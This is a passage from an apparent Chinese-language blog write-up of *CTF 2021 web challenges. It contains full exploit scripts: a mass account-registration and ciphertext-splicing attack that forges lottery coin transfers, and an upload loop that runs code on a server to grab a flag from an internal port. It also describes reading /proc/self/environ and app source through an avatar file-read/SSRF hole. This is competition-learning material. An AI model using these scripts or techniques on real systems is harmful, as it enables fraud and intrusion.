class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: url + <span class="string">&quot;index.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    response = session.post(url + <span class="string">&quot;/user/register&quot;</span>, data=paramsPost, headers=headers)</span><br><span class="line">    data = response.content.strip()</span><br><span class="line">    data = json.loads(data)</span><br><span class="line">    uuid = data[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    resp = session.post(url + <span class="string">&quot;/user/login&quot;</span>, data=&#123;<span class="string">&#x27;username&#x27;</span>: user, <span class="string">&#x27;password&#x27;</span>: user&#125;)</span><br><span class="line">    data = json.loads(resp.content.strip())</span><br><span class="line">    api_token = data[<span class="string">&quot;user&quot;</span>][<span class="string">&quot;api_token&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;uuid&#x27;</span>: uuid, <span class="string">&#x27;api_token&#x27;</span>: api_token&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span>(<span class="params">api_token</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;<span class="string">&quot;api_token&quot;</span>: api_token&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080/user.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;api_token&quot;</span>: <span class="string">&quot;A1k8zDLeR4lmwwuJaZUgpGRFg9AvT6e2&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://52.149.144.45:8080/lottery/buy&quot;</span>, data=paramsPost, headers=headers, cookies=cookies)</span><br><span class="line">    <span class="keyword">return</span> json.loads(response.content.strip())[<span class="string">&#x27;enc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">enc</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsPost = &#123;</span><br><span class="line">        <span class="string">&quot;enc&quot;</span>: enc&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080/lottery.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;api_token&quot;</span>: <span class="string">&quot;A1k8zDLeR4lmwwuJaZUgpGRFg9AvT6e2&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://52.149.144.45:8080/lottery/info&quot;</span>, data=paramsPost, headers=headers, cookies=cookies,</span><br><span class="line">                            proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> json.loads(response.content.strip())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span>(<span class="params">coin, userid, enc</span>):</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    paramsPost = &#123;</span><br><span class="line">        <span class="string">&quot;enc&quot;</span>: enc,</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: userid, <span class="string">&quot;coin&quot;</span>: <span class="built_in">str</span>(coin)&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://52.149.144.45:8080/lottery.html&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">&quot;api_token&quot;</span>: <span class="string">&quot;A1k8zDLeR4lmwwuJaZUgpGRFg9AvT6e2&quot;</span>&#125;</span><br><span class="line">    response = session.post(<span class="string">&quot;http://52.149.144.45:8080/lottery/charge&quot;</span>, data=paramsPost, headers=headers,</span><br><span class="line">                            cookies=cookies, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;[]&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">init_enc, init_info</span>):</span></span><br><span class="line">    userid = init_info[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;user&#x27;</span>]</span><br><span class="line">    coin = init_info[<span class="string">&#x27;info&#x27;</span>][<span class="string">&#x27;coin&#x27;</span>]</span><br><span class="line">    init_enc = b64decode(init_enc)[<span class="number">32</span>:]</span><br><span class="line">    account = register()</span><br><span class="line">    api_token = account[<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">    enc = buy(api_token)</span><br><span class="line">    exp_enc = b64encode(b64decode(enc)[:<span class="number">64</span>] + init_enc)</span><br><span class="line">    <span class="comment"># print info(exp_enc)</span></span><br><span class="line">    charge(coin, userid, exp_enc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">processPools</span>(<span class="params">init_enc, init_info</span>):</span></span><br><span class="line">    num = <span class="number">10</span></span><br><span class="line">    pool = Pool(processes=num)</span><br><span class="line">    jobs = []</span><br><span class="line">    manager = Manager()</span><br><span class="line">    <span class="built_in">dict</span> = manager.<span class="built_in">dict</span>()</span><br><span class="line">    now_num = manager.<span class="built_in">dict</span>()</span><br><span class="line">    now_num[<span class="string">&quot;num&quot;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> ** <span class="number">16</span>):</span><br><span class="line">        job = pool.apply_async(attack, (init_enc, init_info))</span><br><span class="line">        jobs.append(job)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    init_account = register()</span><br><span class="line">    api_token = init_account[<span class="string">&#x27;api_token&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;init account api_token&quot;</span>, api_token</span><br><span class="line">    init_enc = buy(api_token)</span><br><span class="line">    <span class="built_in">print</span> init_enc</span><br><span class="line">    init_info = info(init_enc)</span><br><span class="line">    <span class="built_in">print</span> init_info</span><br><span class="line">    processPools(init_enc, init_info)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‹¿ç€api_tokenå»ä¹°flagå°±å¥½äº†ï¼š</p><img src="/2021/01/19/2021-starctf/xnx2fpzm0THeHme62EjkDDiBzZdBWkttLwTOTITVUaJFIMQVK5ec1nf6gE3tiHfkIoLgJ61QSXxrN2Q4fJ938er7fhgUkdhPmV3LkiFan8fhVTOQ3TL1ERA3pH-9xGFqBNp7M9BF.png" alt="img" style="zoom:50%;"><h2 id="oh-my-socket"><a href="#oh-my-socket" class="headerlink" title="oh-my-socket"></a>oh-my-socket</h2><p>æˆ‘ä»¬æœ‰webserverçš„shellï¼ˆä¼ ä¸ªpythonéšä¾¿æ‰§è¡Œï¼Œå¯ä»¥å¼¹shellï¼‰ï¼Œç„¶åå¦ä¸€ä¸ªserverå®¹å™¨ç›‘å¬21587ç«¯å£ï¼Œå¦‚æœç»™ä»–å‘*ctfï¼Œå°±æŠŠflagå‘è¿‡æ¥ã€‚</p><p>ä½†æ˜¯ç”±äºè¿™ä¸ªclientè¿ç€serverçš„21587ç«¯å£ï¼Œå¯¼è‡´æˆ‘ä»¬æ— æ³•è¿æ¥ã€‚ã€‚ã€‚</p><p>æœ¬æ¥å†™äº†ä¸ªè„šæœ¬ç›‘è§†å¤§å®¶çš„ expï¼Œä½†æ˜¯ä¸€ä¸‹åˆä¹Ÿæ²¡æŠ„åˆ°ä½œä¸šï¼ˆå¯èƒ½æŠŠ exp ä¼ åˆ°éšç§˜çš„ç›®å½•å»äº†ï¼‰ï¼Œåè€Œè‡ªå·±çš„ç›‘è§†è„šæœ¬è¿˜è¢«åˆ«äººæŠ„äº†23333ã€‚</p><p>ä¸è¿‡çœ‹åˆ°æœ‰äººåœ¨ä¼ªé€ æºåœ°å€å’Œç›®çš„åœ°å€åœ¨å‘ TCP åŒ…ï¼Œè¿˜æœ‰äººä¸€ç›´åœ¨è¯»<code>/proc/&lt;pid&gt;/net/netstat</code>ï¼Œä¹Ÿæ²¡å°è¯•ã€‚ä¹‹åç´¢æ€§å†™äº†ä¸ªè„šæœ¬ï¼Œä¸€ç›´ä¸æ–­è¿æ¥ server çš„21587ç«¯å£ï¼Œå¦‚æœæœ‰äººæŠŠé‚£ä¸ªè¿æ¥æ‰“æ–­äº†ä¹‹ç±»çš„ï¼Œå°±å¯ä»¥é©¬ä¸Šä¸Šè½¦äº†ï¼Œç»“æœå°±å‡ºäº†flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from socket import *</span></span><br><span class="line"><span class="string">try:</span></span><br><span class="line"><span class="string">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</span></span><br><span class="line"><span class="string">    tcpSerSock.connect((&#x27;172.21.0.2&#x27;, 21587))</span></span><br><span class="line"><span class="string">    tcpSerSock.send(b&#x27;*ctf&#x27;)</span></span><br><span class="line"><span class="string">    #tcpSerSock.send(b&#x27;GET /file?name=%2Fproc%2Fself%2Fenviron HTTP/1.1\\r\\n\\r\\n&#x27;)</span></span><br><span class="line"><span class="string">    print(tcpSerSock.recv(1280))</span></span><br><span class="line"><span class="string">except Exception as e:</span></span><br><span class="line"><span class="string">    print(&quot;ERROR&quot;, e)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    paramsMultipart = [(<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;gml.py&#x27;</span>, code, <span class="string">&#x27;application/octet-stream&#x27;</span>))]</span><br><span class="line">    headers = &#123;<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;null&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = session.post(<span class="string">&quot;http://101.33.124.168:5001/upload&quot;</span>, files=paramsMultipart, headers=headers,</span><br><span class="line">                            proxies=&#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;, timeout=<span class="number">4</span>)</span><br><span class="line">        res = response.content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;*ctf&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;success!&quot;</span></span><br><span class="line">            <span class="built_in">print</span> response.content</span><br><span class="line">            exit()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/2021-starctf/owMlBXy5xeDvpNAMdaJa3jpXKqCY4tfXNnI3O2KdT1f54jDZ7MLyPaybcy_IcQqEzI94nPVXYmr90Ne-wo7zI7nL9IdOUT3Imw_0ROCSwTafcf743Syp8uQ7KdpNTLNMdXeiAIuf.png" alt="img"></p><p>é¢„æœŸè§£æ˜¯ä¼ªé€ ä¸€ä¸ªä»serveråˆ°clientçš„RSTï¼Œä»è€Œæ–­å¼€è¿æ¥ï¼Œå¯ä»¥å‚è€ƒ L æˆ˜é˜Ÿå¸ˆå‚…çš„ <a href="https://blog.frankli.site/2021/01/18/*CTF-2021-Web/#oh-my-socket">https://blog.frankli.site/2021/01/18/*CTF-2021-Web/#oh-my-socket</a>ã€‚çœ‹èµ·æ¥æ¯”èµ›çš„æ—¶å€™æˆ‘æŠ„åˆ°äº†çœŸæ­£çš„ expï¼Œåªæ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ 2333ã€‚</p><p>æ²¡æƒ³åˆ°ç»å¸¸å’Œå®éªŒå®¤åˆä½œçš„é’±å¿—äº‘è€å¸ˆ TCP æ”»å‡»çš„è®ºæ–‡ï¼Œè¿˜è¢«ç”¨æ¥å‡º CTF é¢˜äº†ï¼ˆè¿™å°±æ˜¯ç°åœ¨çš„ CTF ä¹ˆ</p><h2 id="oh-my-bet"><a href="#oh-my-bet" class="headerlink" title="oh-my-bet"></a>oh-my-bet</h2><p>èµ›åå¤ç°çš„ï¼Œè¿™é“é¢˜ç®—æ˜¯è¿™æ¬¡æ¯”èµ›è´¨é‡æœ€é«˜çš„ä¸€é“ Webäº†ï¼ˆå”¯ä¸€ä¸€é“ä¼ ç»Ÿ Web</p><p>æ‰“å¼€é¢˜ç›®ä¸€çœ‹ï¼Œæ²¡å•¥å¤ªå¤šæ¥å£å’ŒåŠŸèƒ½ï¼Œæ³¨å†Œçš„æ—¶å€™å¤´åƒå¤„ï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼š</p><p><img src="/2021/01/19/2021-starctf/0ndq9p7isv5O3w-1WnJbJVCmde2o8lyQnIqou7pwcoo6XKIjh6MDvPgc_tPtx-Tns041ivf31RdOhL2KG-XOO74MDYt1uA34dwBAPJd-av6xCFmyk6aejW9NXCS2rIGYcQ-FYTSD.png" alt="img"></p><p>å¸¸è§„å¥—è·¯ï¼Œä¾æ¬¡è¯»å– <code>/proc/self/environ</code>ï¼Œ<code>/proc/self/cmdline</code>ã€‚è¯»å– <code>/app/app.py</code>ï¼Œ<code>/app/utils.py</code>ï¼Œ<code>/app/config.py</code>ã€‚</p><p>å…³é”®çš„ utils.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> exts <span class="keyword">import</span> redis_client</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session, redirect, url_for</span><br><span class="line"><span class="keyword">from</span> models <span class="keyword">import</span> User</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark_data</span>(<span class="params"><span class="built_in">id</span>, data</span>):</span></span><br><span class="line">    expires = <span class="built_in">int</span>(time.time()) + <span class="number">240</span></span><br><span class="line">    p = redis_client.pipeline()</span><br><span class="line">    p.<span class="built_in">set</span>(<span class="built_in">id</span>, data)</span><br><span class="line">    p.expireat(<span class="built_in">id</span>, expires)</span><br><span class="line">    p.execute()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    data = redis_client.get(<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        data = get_avatar(<span class="built_in">id</span>)</span><br><span class="line">        mark_data(<span class="built_in">id</span>, data)</span><br><span class="line">    <span class="keyword">return</span> data.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_required</span>(<span class="params">f</span>):</span></span><br><span class="line"><span class="meta">    @wraps(f)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorated_function</span>(<span class="params">*args, **kws</span>):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;username&quot;</span>):</span><br><span class="line">               <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">            <span class="keyword">return</span> f(*args, **kws)</span><br><span class="line">    <span class="keyword">return</span> decorated_function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_avatar</span>(<span class="params">username</span>):</span></span><br><span class="line"></span><br><span class="line">    dirpath = os.path.dirname(__file__)</span><br><span class="line">    user = User.query.filter_by(username=username).first()</span><br><span class="line"></span><br><span class="line">    avatar = user.avatar</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">&#x27;.+:.+&#x27;</span>, avatar):</span><br><span class="line">        path = avatar</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        path = <span class="string">&#x27;/&#x27;</span>.join([<span class="string">&#x27;file:/&#x27;</span>, dirpath, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;img&#x27;</span>, <span class="string">&#x27;avatar&#x27;</span>, avatar])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        content = base64.b64encode(urllib.request.urlopen(path).read())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_path = <span class="string">&#x27;/&#x27;</span>.join([<span class="string">&#x27;file:/&#x27;</span>, dirpath, <span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;img&#x27;</span>, <span class="string">&#x27;avatar&#x27;</span>, <span class="string">&#x27;error.png&#x27;</span>])</span><br><span class="line">        content = base64.b64encode(urllib.request.urlopen(error_path).read())</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_dice</span>():</span></span><br><span class="line">    dices = [<span class="string">&#x27;1.gif&#x27;</span>, <span class="string">&#x27;2.gif&#x27;</span>, <span class="string">&#x27;3.gif&#x27;</span>, <span class="string">&#x27;4.gif&#x27;</span>, <span class="string">&#x27;5.gif&#x27;</span>, <span class="string">&#x27;6.gif&#x27;</span>, <span class="string">&#x27;surprise1.gif&#x27;</span>, <span class="string">&#x27;surprise2.gif&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> random.choice(dices)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_card</span>():</span></span><br><span class="line">    color = [<span class="string">&#x27;â™ ï¸ï¸&#x27;</span>, <span class="string">&#x27;â¤ï¸ &#x27;</span>, <span class="string">&#x27;ï¸ï¸ğŸ”·&#x27;</span>, <span class="string">&#x27;â™£ï¸&#x27;</span>, <span class="string">&#x27;ğŸš©&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%-5s&quot;</span> % random.choice(color) + <span class="string">&#x27; &#x27;</span> + <span class="string">&quot;%-3s&quot;</span> % <span class="built_in">str</span>(random.randint(<span class="number">1</span>, <span class="number">15</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">data</span>):</span></span><br><span class="line">    m = hashlib.md5(data.encode())</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br></pre></td></tr></table></figure><p>config.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ftp_login</span>(<span class="params">self</span>):</span></span><br><span class="line">        ftp = FTP()</span><br><span class="line">        ftp.connect(<span class="string">&quot;172.20.0.2&quot;</span>, <span class="number">8877</span>)</span><br><span class="line">        ftp.login(<span class="string">&quot;fan&quot;</span>, <span class="string">&quot;root&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> ftp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span>(<span class="params">self,*args, **kwargs</span>):</span></span><br><span class="line">        data = json.loads(args[<span class="number">0</span>].decode())</span><br><span class="line">        self.data = data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_config</span>(<span class="params">self</span>):</span></span><br><span class="line">        f = self.ftp_login()</span><br><span class="line">        f.cwd(<span class="string">&quot;files&quot;</span>)</span><br><span class="line">        buf_size = <span class="number">1024</span></span><br><span class="line">        f.retrbinary(<span class="string">&#x27;RETR &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;config.json&#x27;</span>), self.callback, buf_size)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.get_config()</span><br><span class="line">        data = self.data</span><br><span class="line"></span><br><span class="line">        self.secret_key = data[<span class="string">&#x27;secret_key&#x27;</span>]</span><br><span class="line">        self.SECRET_KEY = data[<span class="string">&#x27;secret_key&#x27;</span>]</span><br><span class="line">        self.DEBUG = data[<span class="string">&#x27;DEBUG&#x27;</span>]</span><br><span class="line">        self.SESSION_TYPE = data[<span class="string">&#x27;SESSION_TYPE&#x27;</span>]</span><br><span class="line">        remote_mongo_ip = data[<span class="string">&#x27;REMOTE_MONGO_IP&#x27;</span>]</span><br><span class="line">        remote_mongo_port = data[<span class="string">&#x27;REMOTE_MONGO_PORT&#x27;</span>]</span><br><span class="line">        self.SESSION_MONGODB = pymongo.MongoClient(remote_mongo_ip, remote_mongo_port)</span><br><span class="line">        self.SESSION_MONGODB_DB = data[<span class="string">&#x27;SESSION_MONGODB_DB&#x27;</span>]</span><br><span class="line">        self.SESSION_MONGODB_COLLECT = data[<span class="string">&#x27;SESSION_MONGODB_COLLECT&#x27;</span>]</span><br><span class="line">        self.SESSION_PERMANENT = data[<span class="string">&#x27;SESSION_PERMANENT&#x27;</span>]</span><br><span class="line">        